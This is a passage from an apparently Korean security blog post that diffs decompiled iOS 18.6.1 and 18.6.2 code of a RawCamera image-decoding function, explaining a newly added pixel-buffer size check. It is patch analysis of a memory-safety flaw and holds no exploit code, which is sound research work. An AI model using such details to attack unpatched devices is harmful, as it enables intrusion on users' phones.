&#xCC38;&#xACE0;&#xD574;&#xC8FC;&#xC138;&#xC694;.</p><h3 id="&#xCF54;&#xB4DC;-&#xBD84;&#xC11D;"><a href="#&#xCF54;&#xB4DC;-&#xBD84;&#xC11D;" class="headerlink" title="&#xCF54;&#xB4DC; &#xBD84;&#xC11D;"></a>&#xCF54;&#xB4DC; &#xBD84;&#xC11D;</h3><p><code>sub_1DD8A7684</code> &#x2192; <code>sub_1DD8A76DC</code> </p><pre><code class="hljs cpp"># iOS <span class="hljs-number">18.6</span><span class="hljs-number">.1</span> G90<span class="hljs-function"><span class="hljs-keyword">void</span> __fastcall <span class="hljs-title">sub_1DD8A7684</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">        _QWORD *a1,</span></span><span class="hljs-function"><span class="hljs-params">        __int64 a2,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a3,</span></span><span class="hljs-function"><span class="hljs-params">        __int64 a4,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a5,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">int</span> a6,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">int</span> a7,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">int</span> a8,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">const</span> UInt8 *a9,</span></span><span class="hljs-function"><span class="hljs-params">        CFIndex a10)</span></span><span class="hljs-function"></span>{  .  .  .    v12 = CFDataCreateWithBytesNoCopy_6(          (CFAllocatorRef)*kCFAllocatorDefault_ptr,          a9,          a10,          (CFAllocatorRef)*kCFAllocatorNull_ptr);  v13 = CGImageSourceCreateWithData_5(v12, <span class="hljs-number">0L</span>L);  ImageAtIndex = CGImageSourceCreateImageAtIndex(v13, <span class="hljs-number">0L</span>L, <span class="hljs-number">0L</span>L);  BytesPerRow_3 = CGImageGetBytesPerRow_3(ImageAtIndex);  <span class="hljs-keyword">if</span> ( CGImageGetWidth_12(ImageAtIndex) != a5    || (Height_12 = CGImageGetHeight_12(ImageAtIndex), Height_12 != a6)    || (DataProvider_3 = CGImageGetDataProvider_3(ImageAtIndex),        v16 = CGDataProviderCopyData_2(DataProvider_3),        (v17 = v16) == <span class="hljs-number">0L</span>L) )  {    exception_15 = (<span class="hljs-built_in">std</span>::runtime_error *)__cxa_allocate_exception_15(<span class="hljs-number">0x10</span>uLL);    <span class="hljs-built_in">std</span>::runtime_error::runtime_error(exception_15, <span class="hljs-string">&quot;RawCameraException&quot;</span>);    __cxa_throw(exception_15, `typeinfo <span class="hljs-keyword">for</span><span class="hljs-number">&apos;</span><span class="hljs-built_in">std</span>::runtime_error, <span class="hljs-built_in">std</span>::runtime_error::~runtime_error);  }  <span class="hljs-keyword">if</span> ( CFDataGetLength_15(v16) != <span class="hljs-number">4</span> * a5 * a6 )  {    v45 = (<span class="hljs-built_in">std</span>::runtime_error *)__cxa_allocate_exception_15(<span class="hljs-number">0x10</span>uLL);    <span class="hljs-built_in">std</span>::runtime_error::runtime_error(v45, <span class="hljs-string">&quot;RawCameraException&quot;</span>);    __cxa_throw(v45, `typeinfo <span class="hljs-keyword">for</span><span class="hljs-number">&apos;</span><span class="hljs-built_in">std</span>::runtime_error, <span class="hljs-built_in">std</span>::runtime_error::~runtime_error);  }  v18 = <span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>(<span class="hljs-number">0xC</span>uLL);  *(_QWORD *)v18 = <span class="hljs-number">0L</span>L;  *((_DWORD *)v18 + <span class="hljs-number">2</span>) = <span class="hljs-number">0</span>;  v19 = (<span class="hljs-keyword">float32x2_t</span> *)<span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>(<span class="hljs-number">0xC</span>uLL);  v20 = (<span class="hljs-keyword">float</span> *)v19;  v46 = v13;  v47 = v12;  v21 = (<span class="hljs-keyword">float64x2_t</span> *)a1[<span class="hljs-number">231</span>];  v50 = a5;  <span class="hljs-keyword">if</span> ( a1[<span class="hljs-number">232</span>] - (_QWORD)v21 &lt; <span class="hljs-number">0x11</span>uLL )  {    v22 = <span class="hljs-number">0L</span>L;    v23 = <span class="hljs-number">0.0</span>;  }  <span class="hljs-keyword">else</span>  {    v22 = vcvt_f32_f64(*v21);    *(<span class="hljs-keyword">float32x2_t</span> *)v18 = v22;    v23 = v21[<span class="hljs-number">1</span>].f64[<span class="hljs-number">0</span>];    *((<span class="hljs-keyword">float</span> *)v18 + <span class="hljs-number">2</span>) = v23;  }  v24 = (<span class="hljs-keyword">float32x2_t</span>)vdup_n_s32(<span class="hljs-number">0x437F0000</span>u);  *v19 = vdiv_f32(v24, vsub_f32(v24, v22));  v19[<span class="hljs-number">1</span>].f32[<span class="hljs-number">0</span>] = <span class="hljs-number">255.0</span> / (<span class="hljs-keyword">float</span>)(<span class="hljs-number">255.0</span> - v23);  <span class="hljs-keyword">if</span> ( a6 )  {    v52 = <span class="hljs-number">0L</span>L;    v25 = <span class="hljs-number">0</span>;    v26 = <span class="hljs-number">0</span>;    <span class="hljs-keyword">if</span> ( v50 &gt;= a3 )      v27 = a3;    <span class="hljs-keyword">else</span>      v27 = v50;    v49 = v17;    <span class="hljs-keyword">do</span>    {      v28 = (*(__int64 (__fastcall **)(_QWORD *))(*a1 + <span class="hljs-number">40L</span>L))(a1);      BytePtr_16 = CFDataGetBytePtr_16(v17);      <span class="hljs-keyword">if</span> ( v50 )      {        v31 = &amp;BytePtr_16[BytesPerRow_3 * v52];        v32 = (_WORD *)(a2 + <span class="hljs-number">2L</span>L * (v25 + a8 + (v26 + a7) * a3) * v28);        v33 = v50;        <span class="hljs-keyword">do</span>        {          LOBYTE(v30) = *v31;          v34 = *((<span class="hljs-keyword">float</span> *)v18 + <span class="hljs-number">1</span>);          v35 = v20[<span class="hljs-number">1</span>];          v36 = (<span class="hljs-keyword">float</span>)((<span class="hljs-keyword">float</span>)LODWORD(v30) - *(<span class="hljs-keyword">float</span> *)v18) * *v20;          v37 = <span class="hljs-number">255.0</span>;          <span class="hljs-keyword">if</span> ( v36 &lt;= <span class="hljs-number">255.0</span> )            v38 = v36;          <span class="hljs-keyword">else</span>            v38 = <span class="hljs-number">255.0</span>;          <span class="hljs-keyword">if</span> ( v36 &gt;= <span class="hljs-number">0.0</span> )            v39 = v38;          <span class="hljs-keyword">else</span>            v39 = <span class="hljs-number">0.0</span>;          *v32 = *((_WORD *)a1 + (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(<span class="hljs-keyword">int</span>)v39 + <span class="hljs-number">156</span>);<span class="hljs-comment">// R channel: LUT[clamp((R - blackR) * gainR)] -&gt; store 16-bit</span>          LOBYTE(v39) = v31[<span class="hljs-number">1</span>];          v40 = (<span class="hljs-keyword">float</span>)((<span class="hljs-keyword">float</span>)LODWORD(v39) - v34) * v35;          <span class="hljs-keyword">if</span> ( v40 &lt;= <span class="hljs-number">255.0</span> )            v41 = v40;          <span class="hljs-keyword">else</span>            v41 = <span class="hljs-number">255.0</span>;          <span class="hljs-keyword">if</span> ( v40 &gt;= <span class="hljs-number">0.0</span> )            v42 = v41;          <span class="hljs-keyword">else</span>            v42 = <span class="hljs-number">0.0</span>;          v32[<span class="hljs-number">1</span>] = *((_WORD *)a1 + (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(<span class="hljs-keyword">int</span>)v42 + <span class="hljs-number">412</span>);<span class="hljs-comment">// G channel: LUT[clamp((G - blackG) * gainG)] -&gt; store 16-bit</span>          LOBYTE(v42) = v31[<span class="hljs-number">2</span>];          v43 = (<span class="hljs-keyword">float</span>)((<span class="hljs-keyword">float</span>)LODWORD(v42) - *((<span class="hljs-keyword">float</span> *)v18 + <span class="hljs-number">2</span>)) * v20[<span class="hljs-number">2</span>];          <span class="hljs-keyword">if</span> ( v43 &lt;= <span class="hljs-number">255.0</span> )            v37 = v43;          <span class="hljs-keyword">if</span> ( v43 &gt;= <span class="hljs-number">0.0</span> )            v30 = v37;          <span class="hljs-keyword">else</span>            v30 = <span class="hljs-number">0.0</span>;          v32[<span class="hljs-number">2</span>] = *((_WORD *)a1 + (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(<span class="hljs-keyword">int</span>)v30 + <span class="hljs-number">668</span>);<span class="hljs-comment">// B channel: LUT[clamp((B - blackB) * gainB)] -&gt; store 16-bit</span>          <span class="hljs-keyword">if</span> ( ++v25 &gt;= v27 )          {            v25 = <span class="hljs-number">0</span>;            v32 = (_WORD *)(a2                          + <span class="hljs-number">2L</span>L * (a8 + (++v26 + a7) * a3) * (*(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> (__fastcall **)(_QWORD *))(*a1 + <span class="hljs-number">40L</span>L))(a1));          }          <span class="hljs-keyword">else</span>          {            v32 += <span class="hljs-number">3</span>;          }          v31 += <span class="hljs-number">4</span>;          --v33;        }        <span class="hljs-keyword">while</span> ( v33 );      }      ++v52;      v17 = v49;    }    <span class="hljs-keyword">while</span> ( v52 != Height_12 );  }  <span class="hljs-function"><span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(v20)</span></span>;  <span class="hljs-function"><span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(v18)</span></span>;  <span class="hljs-keyword">if</span> ( v17 )    CFRelease_60(v17);  <span class="hljs-keyword">if</span> ( v47 )    CFRelease_60(v47);  <span class="hljs-keyword">if</span> ( v46 )    CFRelease_60(v46);  <span class="hljs-keyword">if</span> ( ImageAtIndex )  {    <span class="hljs-keyword">if</span> ( ((vars8 ^ (<span class="hljs-number">2</span> * vars8)) &amp; <span class="hljs-number">0x4000000000000000</span>LL) != <span class="hljs-number">0</span> )      __break(<span class="hljs-number">0xC471</span>u);    CFRelease_60(ImageAtIndex);  }}</code></pre><pre><code class="hljs c"># iOS <span class="hljs-number">18.6</span><span class="hljs-number">.2</span> G100<span class="hljs-function"><span class="hljs-keyword">void</span> __fastcall <span class="hljs-title">sub_1DD8A76DC</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">        _QWORD *a1,</span></span><span class="hljs-function"><span class="hljs-params">        __int64 a2,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a3,</span></span><span class="hljs-function"><span class="hljs-params">        __int64 a4,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a5,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a6,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">int</span> a7,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">int</span> a8,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">const</span> UInt8 *a9,</span></span><span class="hljs-function"><span class="hljs-params">        CFIndex a10)</span></span><span class="hljs-function"></span>{  .  .  .      v13 = CFDataCreateWithBytesNoCopy_6(          (CFAllocatorRef)*kCFAllocatorDefault_ptr_0,          a9,          a10,          (CFAllocatorRef)*kCFAllocatorNull_ptr);  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)CMPhotoDecompressionSessionCreate_1(v12, <span class="hljs-number">0L</span>L, &amp;v73) )  {    exception_15 = (<span class="hljs-built_in">std</span>::runtime_error *)__cxa_allocate_exception_15(<span class="hljs-number">0x10</span>uLL);    <span class="hljs-built_in">std</span>::runtime_error::runtime_error(exception_15, <span class="hljs-string">&quot;RawCameraException&quot;</span>);    __cxa_throw(      exception_15,      (struct type_info *)`typeinfo <span class="hljs-keyword">for</span><span class="hljs-number">&apos;</span><span class="hljs-built_in">std</span>::runtime_error,      (<span class="hljs-keyword">void</span> (__fastcall *)(<span class="hljs-keyword">void</span> *))<span class="hljs-built_in">std</span>::runtime_error::~runtime_error);  }  v74[<span class="hljs-number">5</span>] = *kCMPhotoDecompressionContainerOption_AllowedFormatsAndCodecs_ptr;  v74[<span class="hljs-number">3</span>] = *kCMPhotoContainerFormatString_JFIF_ptr;  v74[<span class="hljs-number">4</span>] = &amp;off_1F5F47C00;  v14 = sub_1DDABA420(OBJC_CLASS___NSDictionary_ptr_0);  v15 = (<span class="hljs-keyword">void</span> *)objc_claimAutoreleasedReturnValue_94(v14);  v74[<span class="hljs-number">6</span>] = v15;  v16 = sub_1DDABA420(OBJC_CLASS___NSDictionary_ptr_0);  v17 = (<span class="hljs-keyword">void</span> *)objc_claimAutoreleasedReturnValue_94(v16);  objc_release(v15);  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)CMPhotoDecompressionSessionCreateContainer_1(v73, v17, v13, <span class="hljs-number">0L</span>L, &amp;v72) )  {    v52 = (<span class="hljs-built_in">std</span>::runtime_error *)__cxa_allocate_exception_15(<span class="hljs-number">0x10</span>uLL);    <span class="hljs-built_in">std</span>::runtime_error::runtime_error(v52, <span class="hljs-string">&quot;RawCameraException&quot;</span>);    __cxa_throw(      v52,      (struct type_info *)`typeinfo <span class="hljs-keyword">for</span><span class="hljs-number">&apos;</span><span class="hljs-built_in">std</span>::runtime_error,      (<span class="hljs-keyword">void</span> (__fastcall *)(<span class="hljs-keyword">void</span> *))<span class="hljs-built_in">std</span>::runtime_error::~runtime_error);  }  v70 = <span class="hljs-number">0L</span>L;  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)CMPhotoDecompressionContainerGetImageCount_0(v72, &amp;v70) || v70 &lt;= <span class="hljs-number">0</span> )  {    v53 = (<span class="hljs-built_in">std</span>::runtime_error *)__cxa_allocate_exception_15(<span class="hljs-number">0x10</span>uLL);    <span class="hljs-built_in">std</span>::runtime_error::runtime_error(v53, <span class="hljs-string">&quot;RawCameraException&quot;</span>);    __cxa_throw(      v53,      (struct type_info *)`typeinfo <span class="hljs-keyword">for</span><span class="hljs-number">&apos;</span><span class="hljs-built_in">std</span>::runtime_error,      (<span class="hljs-keyword">void</span> (__fastcall *)(<span class="hljs-keyword">void</span> *))<span class="hljs-built_in">std</span>::runtime_error::~runtime_error);  }  v74[<span class="hljs-number">1</span>] = *kCMPhotoDecompressionOption_OutputPixelFormat_ptr;  v74[<span class="hljs-number">2</span>] = &amp;off_1F5F487D0;  v18 = sub_1DDABA420(OBJC_CLASS___NSDictionary_ptr_0);  v19 = objc_claimAutoreleasedReturnValue_94(v18);  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)CMPhotoDecompressionContainerCreateImageForIndex_1(v72, <span class="hljs-number">0L</span>L, v19, <span class="hljs-number">2L</span>L, &amp;v71) )  {    v54 = (<span class="hljs-built_in">std</span>::runtime_error *)__cxa_allocate_exception_15(<span class="hljs-number">0x10</span>uLL);    <span class="hljs-built_in">std</span>::runtime_error::runtime_error(v54, <span class="hljs-string">&quot;RawCameraException&quot;</span>);    __cxa_throw(      v54,      (struct type_info *)`typeinfo <span class="hljs-keyword">for</span><span class="hljs-number">&apos;</span><span class="hljs-built_in">std</span>::runtime_error,      (<span class="hljs-keyword">void</span> (__fastcall *)(<span class="hljs-keyword">void</span> *))<span class="hljs-built_in">std</span>::runtime_error::~runtime_error);  }  BytesPerRow_11 = CVPixelBufferGetBytesPerRow_11(v71);  DataSize_0 = CVPixelBufferGetDataSize_0(v71);  v69 = a6;  v74[<span class="hljs-number">0</span>] = a5;  v21 = *(_QWORD *)sub_1DD8A8C14(v74, &amp;v69);  v68 = <span class="hljs-number">4</span>;  v74[<span class="hljs-number">0</span>] = v21;  <span class="hljs-keyword">if</span> ( DataSize_0 != *(_QWORD *)sub_1DD8A8C7C(v74, &amp;v68) )  {    v55 = (<span class="hljs-built_in">std</span>::runtime_error *)__cxa_allocate_exception_15(<span class="hljs-number">0x10</span>uLL);    <span class="hljs-built_in">std</span>::runtime_error::runtime_error(v55, <span class="hljs-string">&quot;RawCameraException&quot;</span>);    __cxa_throw(      v55,      (struct type_info *)`typeinfo <span class="hljs-keyword">for</span><span class="hljs-number">&apos;</span><span class="hljs-built_in">std</span>::runtime_error,      (<span class="hljs-keyword">void</span> (__fastcall *)(<span class="hljs-keyword">void</span> *))<span class="hljs-built_in">std</span>::runtime_error::~runtime_error);  }  v22 = (<span class="hljs-keyword">float</span> *)<span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>(<span class="hljs-number">0xC</span>uLL);  *(_QWORD *)v22 = <span class="hljs-number">0L</span>L;  v22[<span class="hljs-number">2</span>] = <span class="hljs-number">0.0</span>;  v23 = (<span class="hljs-keyword">float</span> *)<span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>(<span class="hljs-number">0xC</span>uLL);  v24 = v23;  __asm { FMOV            V0<span class="hljs-number">.2</span>S, #<span class="hljs-number">1.0</span> }  *(_QWORD *)v23 = _D0;  v23[<span class="hljs-number">2</span>] = <span class="hljs-number">1.0</span>;  v30 = (<span class="hljs-keyword">float64x2_t</span> *)a1[<span class="hljs-number">231</span>];  <span class="hljs-keyword">if</span> ( a1[<span class="hljs-number">232</span>] - (_QWORD)v30 &lt; <span class="hljs-number">0x11</span>uLL )  {    v31 = <span class="hljs-number">0L</span>L;    v32 = <span class="hljs-number">0.0</span>;  }  <span class="hljs-keyword">else</span>  {    v31 = vcvt_f32_f64(*v30);    *(<span class="hljs-keyword">float32x2_t</span> *)v22 = v31;    v32 = v30[<span class="hljs-number">1</span>].f64[<span class="hljs-number">0</span>];    v22[<span class="hljs-number">2</span>] = v32;  }  v33 = (<span class="hljs-keyword">float32x2_t</span>)vdup_n_s32(<span class="hljs-number">0x437F0000</span>u);  *(<span class="hljs-keyword">float32x2_t</span> *)v23 = vdiv_f32(v33, vsub_f32(v33, v31));  v23[<span class="hljs-number">2</span>] = <span class="hljs-number">255.0</span> / (<span class="hljs-keyword">float</span>)(<span class="hljs-number">255.0</span> - v32);  <span class="hljs-keyword">if</span> ( CVPixelBufferLockBaseAddress_11(v71, <span class="hljs-number">0L</span>L) )  {    v56 = (<span class="hljs-built_in">std</span>::runtime_error *)__cxa_allocate_exception_15(<span class="hljs-number">0x10</span>uLL);    <span class="hljs-built_in">std</span>::runtime_error::runtime_error(v56, <span class="hljs-string">&quot;RawCameraException&quot;</span>);    __cxa_throw(      v56,      (struct type_info *)`typeinfo <span class="hljs-keyword">for</span><span class="hljs-number">&apos;</span><span class="hljs-built_in">std</span>::runtime_error,      (<span class="hljs-keyword">void</span> (__fastcall *)(<span class="hljs-keyword">void</span> *))<span class="hljs-built_in">std</span>::runtime_error::~runtime_error);  }  v57 = (<span class="hljs-keyword">void</span> *)v19;  v58 = v13;  BaseAddress_11 = (<span class="hljs-keyword">char</span> *)CVPixelBufferGetBaseAddress_11(v71);  <span class="hljs-keyword">if</span> ( a6 )  {    v35 = <span class="hljs-number">0L</span>L;    v36 = <span class="hljs-number">0</span>;    v37 = <span class="hljs-number">0</span>;    <span class="hljs-keyword">if</span> ( a5 &gt;= a3 )      v38 = a3;    <span class="hljs-keyword">else</span>      v38 = a5;    v62 = BaseAddress_11 + <span class="hljs-number">2</span>;    v59 = a5;    <span class="hljs-keyword">do</span>    {      v39 = (*(__int64 (__fastcall **)(_QWORD *))(*a1 + <span class="hljs-number">40L</span>L))(a1);      v61 = v35;      <span class="hljs-keyword">if</span> ( a5 )      {        v41 = v62;        v42 = (_WORD *)(a2 + <span class="hljs-number">2L</span>L * (v36 + a8 + (v37 + a7) * a3) * v39);        <span class="hljs-keyword">do</span>        {          LOBYTE(v40) = *v41;          v43 = (<span class="hljs-keyword">float</span>)((<span class="hljs-keyword">float</span>)LODWORD(v40) - v22[<span class="hljs-number">2</span>]) * v24[<span class="hljs-number">2</span>];          v44 = <span class="hljs-number">255.0</span>;          <span class="hljs-keyword">if</span> ( v43 &lt;= <span class="hljs-number">255.0</span> )            v45 = v43;          <span class="hljs-keyword">else</span>            v45 = <span class="hljs-number">255.0</span>;          <span class="hljs-keyword">if</span> ( v43 &gt;= <span class="hljs-number">0.0</span> )            v46 = v45;          <span class="hljs-keyword">else</span>            v46 = <span class="hljs-number">0.0</span>;          *v42 = *((_WORD *)a1 + (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(<span class="hljs-keyword">int</span>)v46 + <span class="hljs-number">668</span>);          LOBYTE(v46) = *(v41 - <span class="hljs-number">1</span>);          v47 = (<span class="hljs-keyword">float</span>)((<span class="hljs-keyword">float</span>)LODWORD(v46) - v22[<span class="hljs-number">1</span>]) * v24[<span class="hljs-number">1</span>];          <span class="hljs-keyword">if</span> ( v47 &lt;= <span class="hljs-number">255.0</span> )            v48 = v47;          <span class="hljs-keyword">else</span>            v48 = <span class="hljs-number">255.0</span>;          <span class="hljs-keyword">if</span> ( v47 &gt;= <span class="hljs-number">0.0</span> )            v49 = v48;          <span class="hljs-keyword">else</span>            v49 = <span class="hljs-number">0.0</span>;          v42[<span class="hljs-number">1</span>] = *((_WORD *)a1 + (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(<span class="hljs-keyword">int</span>)v49 + <span class="hljs-number">412</span>);          LOBYTE(v49) = *(v41 - <span class="hljs-number">2</span>);          v50 = (<span class="hljs-keyword">float</span>)((<span class="hljs-keyword">float</span>)LODWORD(v49) - *v22) * *v24;          <span class="hljs-keyword">if</span> ( v50 &lt;= <span class="hljs-number">255.0</span> )            v44 = v50;          <span class="hljs-keyword">if</span> ( v50 &gt;= <span class="hljs-number">0.0</span> )            v40 = v44;          <span class="hljs-keyword">else</span>            v40 = <span class="hljs-number">0.0</span>;          v42[<span class="hljs-number">2</span>] = *((_WORD *)a1 + (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(<span class="hljs-keyword">int</span>)v40 + <span class="hljs-number">156</span>);          <span class="hljs-keyword">if</span> ( ++v36 &gt;= v38 )          {            v36 = <span class="hljs-number">0</span>;            v42 = (_WORD *)(a2                          + <span class="hljs-number">2L</span>L * (a8 + (++v37 + a7) * a3) * (*(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> (__fastcall **)(_QWORD *))(*a1 + <span class="hljs-number">40L</span>L))(a1));          }          <span class="hljs-keyword">else</span>          {            v42 += <span class="hljs-number">3</span>;          }          v41 += <span class="hljs-number">4</span>;          --a5;        }        <span class="hljs-keyword">while</span> ( a5 );      }      v35 = v61 + <span class="hljs-number">1</span>;      v62 += BytesPerRow_11;      a5 = v59;    }    <span class="hljs-keyword">while</span> ( v61 + <span class="hljs-number">1</span> != a6 );  }  <span class="hljs-function"><span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(v24)</span></span>;  <span class="hljs-function"><span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(v22)</span></span>;  objc_release(v57);  objc_release(v17);  <span class="hljs-keyword">if</span> ( v58 )    CFRelease_60(v58);  <span class="hljs-keyword">if</span> ( v73 )    CFRelease_60(v73);  <span class="hljs-keyword">if</span> ( v72 )    CFRelease_60(v72);  CVPixelBufferUnlockBaseAddress_11(v71, <span class="hljs-number">0L</span>L);  <span class="hljs-keyword">if</span> ( v71 )    CFRelease_60(v71);}</code></pre><p>&#xCF54;&#xB4DC;&#xB97C; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xB2C8; &#xD06C;&#xAC8C; 3&#xAC00;&#xC9C0; &#xC815;&#xB3C4;&#xAC00; &#xBCC0;&#xACBD;&#xB41C; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><ol><li><p><strong>CGImage* &#x2192; CMPhoto + CVPixelBuffer</strong></p><p> <strong>G90 (18.6.1)</strong></p><ul><li><p>CGImageSourceCreateWithData &#x2192; CGImageSourceCreateImageAtIndex&#xB85C; CGImage&#xB97C; &#xB9CC;&#xB4E0; &#xB4A4;</p><p>  CGImageGetDataProvider &#x2192; CGDataProviderCopyData&#xB85C; <strong>&#xD3C9;&#xBA74; &#xBC14;&#xC774;&#xD2B8; &#xBC84;&#xD37C;(CFData)</strong>&#xB97C; &#xC9C1;&#xC811; &#xC5BB;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li><li><p>&#xD3ED;&#xB7;&#xB192;&#xC774;&#xC640; CFDataGetLength() == 4<em>w</em>h&#xB9CC; &#xAC80;&#xC0AC;&#xD558;&#xACE0; &#xADF8;&#xB300;&#xB85C; &#xBC14;&#xC774;&#xD2B8; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC21C;&#xD68C;&#xD569;&#xB2C8;&#xB2E4;.</p><p><strong>G100 (18.6.2)</strong></p></li><li><p>&#xC0C8;&#xB85C;&#xC6B4; <strong>CMPhoto</strong> &#xB514;&#xCF54;&#xB529; &#xD30C;&#xC774;&#xD504;&#xB77C;&#xC778;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>CMPhotoDecompressionSessionCreate</li><li>CMPhotoDecompressionSessionCreateContainer (&#xCEE8;&#xD14C;&#xC774;&#xB108; &#xC635;&#xC158;&#xC5D0; <strong>JFIF</strong> &#xC9C0;&#xC815;)</li><li>CMPhotoDecompressionContainerCreateImageForIndex &#x2192; <strong>CVPixelBuffer</strong> &#xD68D;&#xB4DD;</li></ul></li><li>&#xC774;&#xD6C4; CVPixelBufferLockBaseAddress / GetBaseAddress&#xB85C; <strong>&#xD53D;&#xC140; &#xBC84;&#xD37C;&#xB97C; &#xC7A0;&#xADF8;&#xACE0; &#xC548;&#xC804;&#xD558;&#xAC8C; &#xC811;&#xADFC;</strong>&#xD569;&#xB2C8;&#xB2E4;.</li><li>__stack_chk_guard&#xB3C4; &#xCD94;&#xAC00;</li></ul></li><li><p><strong>&#xBC84;&#xD37C; &#xD06C;&#xAE30; &#xAC80;&#xC99D; &#xCD94;&#xAC00;</strong></p><p> <strong>G90 (18.6.1)</strong></p> <pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (CFDataGetLength(data) != <span class="hljs-number">4</span> * width * height) <span class="hljs-keyword">throw</span> RawCameraException;</code></pre><ul><li>&#xB2E8;&#xC21C;&#xD788; 4<em>w</em>h&#xC640; CFData &#xAE38;&#xC774;&#xB9CC; &#xBE44;&#xAD50;&#xD569;&#xB2C8;&#xB2E4;.</li><li><p>bytesPerRow&#xB098; &#xCD9C;&#xB825; &#xD3EC;&#xB9F7; &#xBCC0;&#xD654;&#xC5D0; &#xB530;&#xB978; &#xC2E4;&#xC81C; &#xB370;&#xC774;&#xD130; &#xD06C;&#xAE30; &#xBCC0;&#xB3D9;&#xC744; &#xBC18;&#xC601;&#xD558;&#xC9C0; &#xBABB;&#xD569;&#xB2C8;&#xB2E4;.</p><p><strong>G100 (18.6.2)</strong></p><pre><code class="hljs cpp">BytesPerRow = CVPixelBufferGetBytesPerRow(buf);DataSize    = CVPixelBufferGetDataSize(buf);<span class="hljs-comment">// expected = f(width, height)  // sub_1DD8A8C14</span><span class="hljs-comment">// bpp = 4                       // v68=4 &#x2192; sub_1DD8A8C7C</span><span class="hljs-keyword">if</span> (DataSize != expected) <span class="hljs-keyword">throw</span> RawCameraException;</code></pre></li><li><p><strong>&#xC2E4;&#xC81C; &#xD53D;&#xC140;&#xBC84;&#xD37C;&#xC758; &#xCD1D; &#xB370;&#xC774;&#xD130; &#xD06C;&#xAE30;</strong>(CVPixelBufferGetDataSize)&#xC640;, &#xB0B4;&#xBD80; &#xD5EC;&#xD37C;(sub_1DD8A8C14/7C)&#xAC00; &#xACC4;&#xC0B0;&#xD55C; <strong>&#xAE30;&#xB300;&#xCE58;</strong>&#xB97C; &#xBE44;&#xAD50;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li>&#xAE30;&#xB300;&#xCE58;&#xB294; width/height/bpp(=4)&#xBFD0; &#xC544;&#xB2C8;&#xB77C; <strong>stride(&#xD589;&#xBCC4; &#xBC14;&#xC774;&#xD2B8; &#xC218;)</strong> &#xAC19;&#xC740; &#xD604;&#xC2E4; &#xC694;&#xC18C;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB3C4;&#xB85D; &#xC124;&#xACC4;&#xB41C; &#xD615;&#xD0DC;&#xB85C; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;.</li><li><p>&#xBD88;&#xC77C;&#xCE58; &#xC2DC; &#xC989;&#xC2DC; &#xC608;&#xC678;&#xB97C; &#xB358;&#xC838; &#xD6C4;&#xC18D; &#xC4F0;&#xAE30; &#xACBD;&#xB85C; &#xC9C4;&#xC785;&#xC744; &#xB9C9;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#x2192; CFData&#xC758; &#xCD94;&#xC0C1;&#xC801; &#xAE38;&#xC774; &#xBE44;&#xAD50; &#x2192; CVPixelBuffer&#xC758; &#xC2E4;&#xC81C; &#xBA54;&#xBAA8;&#xB9AC; &#xBC30;&#xCE58; &#xAE30;&#xBC18; &#xBE44;&#xAD50;&#xB85C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p></li></ul></li><li><p><strong>&#xD53D;&#xC140; &#xD3EC;&#xB9F7;/&#xCC44;&#xB110; &#xC811;&#xADFC; &#xC21C;&#xC11C;</strong></p><p> <strong>G90 (18.6.1)</strong></p><ul><li>BytePtr&#xC5D0;&#xC11C; <strong>R, G, B</strong> 